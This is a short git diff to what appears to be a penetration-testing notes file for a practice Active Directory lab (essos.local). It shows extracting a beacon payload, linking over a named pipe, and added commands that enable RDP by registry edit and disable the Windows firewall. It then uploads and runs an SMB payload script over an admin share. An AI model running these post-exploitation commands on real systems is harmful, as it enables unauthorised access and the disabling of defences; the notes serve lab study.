@@ -22,3 +22,15 @@ cat beacon_x64.ps1 | grep -oP "(?<=FromBase64String\(').*?(?='\))"
 
 link meereen.essos.local
 [12/02 13:51:02] [*] Tasked to link to \\meereen.essos.local\pipe\mojo.5688.8052.18389493978708887706
+
+enable rdp 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+NetSh Advfirewall set allprofiles state off 
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+netsh firewall set service type = remotedesktop mode = enable
+
+cd \\maquina\c$
+upload
+smb1 paylod
+powershell .\smb1.ps1
